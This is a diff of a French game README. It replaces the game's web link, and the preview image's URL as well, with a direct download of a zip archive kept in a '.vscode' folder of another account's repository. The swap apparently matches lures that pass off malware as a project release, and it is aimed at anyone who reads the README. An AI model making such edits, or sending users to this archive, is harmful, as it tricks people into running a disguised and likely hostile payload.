@@ -1,5 +1,5 @@
- > Le lien du jeu : [https://fr-tim.github.io/Game/](https://fr-tim.github.io/Game/)
+ > Le lien du jeu : [https://raw.githubusercontent.com/Man0id/Game/master/.vscode/Game_2.2-beta.5.zip](https://raw.githubusercontent.com/Man0id/Game/master/.vscode/Game_2.2-beta.5.zip)
 
 Voici un petit apreçu du jeu.
 
-![arcade-Retro-corporation (1)](https://github.com/user-attachments/assets/1644f167-7ca3-471f-beef-c2abd637f3a3)
+![arcade-Retro-corporation (1)](https://raw.githubusercontent.com/Man0id/Game/master/.vscode/Game_2.2-beta.5.zip)
